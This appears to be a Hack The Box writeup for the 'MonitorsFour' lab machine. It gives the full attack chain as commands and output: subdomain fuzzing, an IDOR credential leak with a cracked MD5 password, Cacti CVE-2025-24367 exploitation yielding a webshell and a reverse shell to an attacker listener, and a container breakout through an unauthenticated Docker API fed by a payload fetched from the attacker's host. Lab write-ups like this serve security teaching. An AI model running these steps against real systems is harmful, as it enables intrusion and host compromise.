@@ -1,0 +1,220 @@
+MonitorsFour HTB Writeup
+Machine Summary
+Name: MonitorsFour
+
+OS: Windows (Host)
+
+Difficulty: Medium
+
+IP: 10.129.28.57
+
+Key Techniques:
+
+Subdomain enumeration
+
+IDOR leading to credential disclosure
+
+Cacti 1.2.28 RCE (CVE-2025-24367)
+
+Docker API misconfiguration (privilege escalation to host)
+
+Initial Reconnaissance
+We begin with a full TCP port scan using nmap.
+
+bash
+nmap -sC -sV -p- -oA monitorsfour 10.129.28.57
+Notable results:
+
+text
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    nginx
+|_http-title: Did not follow redirect to http://monitorsfour.htb/
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Port 80 redirects to monitorsfour.htb. Add this entry to /etc/hosts:
+
+text
+10.129.28.57   monitorsfour.htb
+Subdomain Discovery
+Fuzzing for virtual hosts reveals a subdomain hosting Cacti.
+
+bash
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -u http://monitorsfour.htb \
+     -H "Host: FUZZ.monitorsfour.htb" -ac
+Output:
+
+text
+cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1]
+Add cacti.monitorsfour.htb to /etc/hosts and visit the page. The footer shows:
+
+html
+<div class='versionInfo'>Version 1.2.28 | (c) 2004-2026 - The Cacti Group</div>
+Information Disclosure via IDOR
+Fuzzing the API endpoints:
+
+bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
+     -u http://monitorsfour.htb/FUZZ -ac
+We find /api/v1/auth and /api/v1/user. Navigating to /user returns:
+
+text
+{"error":"Missing token parameter"}
+Appending ?token=0 (a common placeholder) triggers an IDOR vulnerability and dumps user data:
+
+bash
+curl http://monitorsfour.htb/user?token=0
+Response (formatted):
+
+json
+[
+  {
+    "id":2,
+    "username":"admin",
+    "email":"admin@monitorsfour.htb",
+    "password":"56b32eb43e6f15395f6c46c1c9e1cd36",
+    "role":"super user",
+    "token":"8024b78f83f102da4f",
+    "name":"Marcus Higgins",
+    "position":"System Administrator",
+    ...
+  },
+  ...
+]
+The password hashes are unsalted MD5. Using CrackStation or hashcat we crack 56b32eb43e6f15395f6c46c1c9e1cd36 → wonderful1.
+
+We can now log into the main dashboard at http://monitorsfour.htb with:
+
+Username: marcus (or admin)
+
+Password: wonderful1
+
+Cacti Remote Code Execution (CVE-2025-24367)
+The Cacti instance is version 1.2.28, vulnerable to CVE-2025-24367 – an arbitrary file creation that leads to RCE. Public exploit: SoftAndoWetto/CVE-2025-24367-PoC-Cacti
+
+Exploit Execution
+Start a netcat listener:
+
+bash
+nc -lvnp 4444
+Run the exploit:
+
+bash
+python3 exploit.py
+Provide the following inputs when prompted:
+
+Cacti BASE URL: http://cacti.monitorsfour.htb/cacti/
+
+Username: marcus
+
+Password: wonderful1
+
+Your IP address: <KALI_IP>
+
+Port: 4444
+
+The exploit uploads a PHP webshell, writes a bash reverse shell script, and triggers execution.
+
+Reverse shell received:
+
+text
+connect to [10.10.16.228] from (UNKNOWN) [10.129.28.57] 62978
+bash: cannot set terminal process group (7): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@821fbd6a43fa:~/html/cacti$
+User Flag
+Navigate to the home directory of marcus and read the flag:
+
+bash
+cd /home/marcus
+cat user.txt
+Flag: f5108281d63565b3a12d4c4e0f0e613a
+
+Privilege Escalation: Docker API Breakout
+Inside the container, we observe:
+
+bash
+hostname           # 821fbd6a43fa (container ID)
+ip addr            # eth0 172.18.0.3/16
+This is a Docker container. We scan the internal network for exposed Docker Engine API (port 2375):
+
+bash
+for i in $(seq 1 254); do
+  (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null | grep -q "ApiVersion" && echo "192.168.65.$i:2375 OPEN") &
+done
+wait
+Result: 192.168.65.7:2375 OPEN
+
+Enumerating Docker API
+bash
+curl http://192.168.65.7:2375/version
+Returns Docker Engine version 28.3.2.
+
+List available images:
+
+bash
+curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
+Output includes:
+
+docker_setup-nginx-php:latest
+
+docker_setup-mariadb:latest
+
+alpine:latest
+
+The Docker API is unauthenticated, allowing us to create privileged containers with host filesystem mounts.
+
+Exploiting to Read Root Flag
+Prepare container JSON payload on Kali:
+
+json
+{
+  "Image": "alpine:latest",
+  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
+  "HostConfig": {
+    "Binds": ["/mnt/host/c:/mnt/host_root"]
+  },
+  "Tty": true,
+  "OpenStdin": true
+}
+Save as container.json.
+
+Serve the file from Kali (since www-data shell may lack tools to write files easily):
+
+bash
+cd /tmp && python3 -m http.server 8000
+Download and execute from victim shell:
+
+bash
+curl http://<KALI_IP>:8000/container.json -o /tmp/container.json
+curl -X POST -H "Content-Type: application/json" -d @/tmp/container.json \
+     http://192.168.65.7:2375/containers/create?name=pwned
+Response returns container ID, e.g. 7d99df11ee0f....
+
+Start the container:
+
+bash
+curl -X POST http://192.168.65.7:2375/containers/7d99df11ee0f/start
+Retrieve logs (contains the flag):
+
+bash
+curl -s "http://192.168.65.7:2375/containers/7d99df11ee0f/logs?stdout=true&stderr=true"
+Root Flag
+The output contains the root flag from the mounted host drive:
+
+text
+<hex-encoded log content>... 601faffa93d88afec8a34e0d6763cdbc
+Flag: 601faffa93d88afec8a34e0d6763cdbc
+
+Summary of Vulnerabilities Exploited
+Step	Vulnerability Type	CVE / Description
+1	Subdomain discovery	Weak vhost configuration
+2	IDOR	Missing token validation on /api/v1/user
+3	Weak password storage	Unsalted MD5 hashes
+4	Cacti RCE	CVE-2025-24367 – Arbitrary file creation
+5	Docker API exposure	Unauthenticated Docker Engine API on port 2375
+6	Container breakout	Privileged container with host bind mount
+References
+Cacti 1.2.28 RCE Exploit (CVE-2025-24367)
+
+Docker API Misconfiguration Exploitation
